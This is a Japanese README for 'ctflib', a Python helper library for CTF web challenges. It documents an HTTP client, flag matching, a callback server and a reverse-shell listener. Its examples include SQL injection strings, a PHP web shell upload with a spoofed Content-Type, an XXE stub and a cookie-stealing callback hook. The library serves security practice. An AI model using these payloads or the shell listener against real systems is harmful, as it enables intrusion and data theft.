# ctflib

CTF の Web 問題用ライブラリ。外部依存なし（**標準ライブラリのみ**で動く。`requests` 不要）。

```
ctf/
├── ctflib/          # ライブラリ本体
│   ├── client.py    # HTTP リクエスト送信
│   ├── flag.py      # フラグ取得
│   ├── server.py    # 簡易 Web サーバ
│   └── shell.py     # Reverse Shell 受付
├── pyproject.toml
└── tests/           # python3 -m unittest discover -s tests
```

## インストール

どの作業ディレクトリからでも `import ctflib` できるようにする（editable なのでソースを直せば即反映）:

```sh
pip install -e /Users/sota70/workspace/ctf --user --break-system-packages
```

この環境の Python は PEP 668 の externally-managed なので `--user --break-system-packages` が要る
（`~/.local` にだけ入るのでシステムには触らない）。venv 内なら `pip install -e .` だけでよい。
戻す時は `pip uninstall ctflib`。

インストールせずに使うなら、**そのディレクトリで実行するか** `sys.path` を通す:

```python
import sys; sys.path.insert(0, "/Users/sota70/workspace/ctf")
from ctflib import *
```

以降のサンプルは `from ctflib import ...` で書く（`from ctflib import *` でも同じものが入る）。

---

## 1. HTTP リクエスト送信

```python
from ctflib import get, post, request, Session

r = post("http://target/login", data={"user": "admin", "pw": "' OR 1--"})
print(r.status, r.text)
```

ペイロード引数は 3 つ。**指定するだけで `Content-Type` が自動で入る**（同時指定は `ValueError`）。

| 引数 | 付与される Content-Type |
|---|---|
| `data=` | `application/x-www-form-urlencoded` |
| `json=` | `application/json` |
| `form=` | `multipart/form-data; boundary=...` |

```python
post(url, data={"a": 1, "b": [1, 2]})        # a=1&b=1&b=2（dict は自動で url エンコード）
post(url, data="id=1' UNION SELECT flag--")  # str / bytes はそのまま送る（無加工）
post(url, json={"role": "admin"})            # {"role": "admin"}
```

`headers=` に自分で `Content-Type` を書いた場合はそちらが優先される。

```python
post(url, data=b"<?xml ... XXE ...>", headers={"Content-Type": "application/xml"})
post(url, data=b"raw", headers={"Content-Type": None})   # Content-Type を一切付けない
```

### form（multipart / ファイルアップロード）

```python
from pathlib import Path

post(url, form={
    "comment": "hello",                                   # 普通のフィールド
    "tags":    ["a", "b"],                                # 同名フィールドを複数回
    "file1":   Path("shell.php"),                         # パス指定
    "file2":   open("payload.bin", "rb"),                 # 開いたファイル
    "file3":   ("shell.php", "<?php system($_GET[0]); ?>"),         # 名前だけ差し替え
    "file4":   ("shell.php", b"\x89PNG...", "image/png"),           # Content-Type 偽装
})
```

- **タプル** = ファイル指定 `(filename, content[, content_type])`
- **リスト** = 同名フィールドの繰り返し
- `content_type` 省略時は拡張子から推測（不明なら `application/octet-stream`）
- ファイル名の `"` や改行はエスケープされる（`filename="a\";x="` 系のインジェクションを自分でやりたい時は生の `data=` を使う）

### proxy / その他の引数

```python
get(url, proxy="127.0.0.1:8080")                      # Burp に流す（スキーム省略可）
get(url, proxy={"https": "http://127.0.0.1:8080"})    # プロトコル別に指定
```

`proxy` を明示した場合は `$no_proxy` を無視するので、`127.0.0.1` 宛でも確実に Burp を通る。
未指定なら環境変数 `$http_proxy` / `$https_proxy` に従う。

その他: `params=`（クエリ文字列に追記）, `headers=`, `cookies=`, `auth=("user","pass")`,
`timeout=`（既定 15 秒）, `allow_redirects=`（既定 True）, `verify=`（既定 **False**＝証明書検証なし）,
`boundary=`（multipart の境界文字列を固定）。

`request("PUT", url, ...)` で任意メソッド。ショートカットは `get/post/put/patch/delete/head/options`。

### レスポンス

```python
r.status / r.status_code / r.ok / r.reason
r.text          # charset を見てデコード
r.content       # bytes（gzip/deflate は解凍済み）
r.json()
r.headers["set-cookie"]     # 大文字小文字を区別しない。同名ヘッダは改行で連結
r.cookies       # このレスポンスがセットした Cookie
r.url           # リダイレクト後の最終 URL
r.elapsed
r.find_flg("sknb{*}")
"admin" in r    # 本文の部分一致
```

**4xx/5xx でも例外を投げない**（`r.status` を見る）。

### Session（Cookie を保持）

```python
s = Session(base_url="http://target", proxy="127.0.0.1:8080",
            headers={"X-Forwarded-For": "127.0.0.1"})
s.post("/login", data={"u": "admin", "p": "pass"})   # Set-Cookie を保存
print(s.get("/admin").text)                           # 保存した Cookie で再送
s.cookies                    # {'session': '...'}
s.set_cookie("session", "forged", domain="target")
```

モジュール直下の `get()` / `post()` も共有セッション（`default_session`）を使うので Cookie は引き継がれる。

---

## 2. フラグ取得

```python
from ctflib import find_flg, find_flgs

find_flg("Here is your flag: sknb{flag}", "sknb{*}")   # -> 'sknb{flag}'
```

ワイルドカード:

| 記法 | 意味 |
|---|---|
| `*` | 任意の文字列（既定は最短一致） |
| `?` | 任意の 1 文字 |
| `\*` `\?` | リテラルの `*` `?` |

`*` 以外の文字は正規表現としてエスケープされるので `flag[1]{*}` のような書式もそのまま書ける。

```python
find_flg(text, "sknb{*}", greedy=True)    # 最長一致
find_flg(text, "sknb{*}", dotall=True)    # 改行をまたぐ
find_flg(text, "sknb{*}", default="")     # 見つからない時の戻り値（既定 None）
find_flgs(text, "sknb{*}")                # 全件（重複除去・出現順）

find_flg(response, "sknb{*}")             # Response / bytes / リストもそのまま渡せる

set_flag_format("sknb{*}")                # 既定書式を設定（環境変数 CTF_FLAG_FORMAT も可）
find_flg(text)                            # 以降 fmt 省略可
```

コマンドラインからも: `curl -s http://target | python3 -m ctflib flag 'sknb{*}'`

---

## 3. 簡易 Web サーバ

XSS / SSRF / OOB のコールバック受けに。express と同じ `(req, res)`。

```python
from ctflib import route, listen

@route("/hook")               # annotation でエンドポイントとコントローラを紐づける
def hook(req, res):
    print("stolen cookie:", req.query.get("c"))
    res.json({"ok": True})

listen(8000)                  # Ctrl-C まで待ち受け（リクエストは自動でログ表示）
```

エンドポイントを省略すると**関数名**から決まる。

```python
@route                        # -> /hook
def hook(req, res): res.text("ok")

@route                        # index / root は -> /
def index(req, res): res.html("<h1>hi</h1>")

@route                        # __ は / に展開 -> /admin/panel
def admin__panel(req, res): res.text("nested")
```

annotation は関数をそのまま返すので重ねられる。メソッド限定・パスパラメータも同様。

```python
@route("/one")                # 1 つのコントローラを複数のエンドポイントに
@route("/two")
def both(req, res): res.text("both")

@app.post("/login")           # POST のみ
def login(req, res): res.json(req.form)

@route("/user/:id")           # パスパラメータ -> req.params["id"]
def user(req, res): res.text(req.params["id"])

@route("/files/*")            # ワイルドカード -> req.params["*"]
def files(req, res): res.text(req.params["*"])

@app.default                  # どのルートにも一致しなかった時（404 の代わり）
def catch_all(req, res): res.text("ok")
```

lambda など名前のない関数を使う場合はエンドポイントを明示する（従来の第二引数形式も使える）。

```python
route("/user/:id", lambda req, res: res.text(req.params["id"]))
route("/x", ctrl, methods=["GET", "POST"])
```

**req**: `.method` `.path` `.url` `.query` `.query_all` `.headers`（小文字キー）`.body` `.text`
`.form` `.json()` `.cookies` `.params` `.ip` `.time`
（サーバ側の `req.form` は**受信した urlencoded ボディ**のパース結果。クライアントの `form=`（multipart 送信）とは別物）

**res**（メソッドチェーン可）: `.status(code)` `.set(k, v)` `.type(ct)` `.cookie(k, v, **opts)`
`.send(body)` `.json(obj)` `.html(s)` `.text(s)` `.redirect(url)` `.end()`

複数サーバを立てたり、スクリプトを止めずに使う場合:

```python
from ctflib import App
app = App(log=True)
app.listen(8000, background=True)     # 別スレッドで起動
hit = app.wait_hit(timeout=60)        # 新しいリクエストが来るまで待つ
print(hit.query, hit.headers, hit.text)
app.hits                              # 受信した全リクエスト
app.close()
```

起動時に LAN IP を表示するので、そのままペイロードに埋め込める。
`python3 -m ctflib serve 8000` で全リクエストをログするだけのサーバが立つ。

---

## 4. Reverse Shell 受付

```python
from ctflib import reverse_shell

reverse_shell(4444)     # 待ち受け → 接続が来たら対話シェル
```

接続後は入力した文字列がそのままコマンドとして送られ、出力が表示される。
`exit` / `quit` / Ctrl-D で終了（終了時も最後の出力を約 1 秒回収してから閉じる）。

```python
ok = reverse_shell(4444,
                   host="127.0.0.1",   # 待ち受けアドレス（既定 0.0.0.0）
                   timeout=60,         # 60 秒来なければ諦めて False を返す
                   upgrade=True,       # 接続直後に PTY 昇格の一行を送る
                   grace=1.0,          # 終了時に出力を回収する秒数
                   quiet=False)
```

戻り値はシェルが繋がったかどうかの bool。PTY 昇格用の定型文は `UPGRADE_PAYLOADS` に入っている。
`python3 -m ctflib shell 4444` でも同じ。

---

## 制限事項

- リクエストヘッダ名は urllib の仕様で `Title-Case` に正規化される（大文字小文字を区別する
  サーバを狙う場合は生ソケットが必要）。
- `verify` は既定で False（自己署名証明書や Burp の MITM 用）。
- HTTP/2、Brotli、チャンク送信のリクエストには非対応。
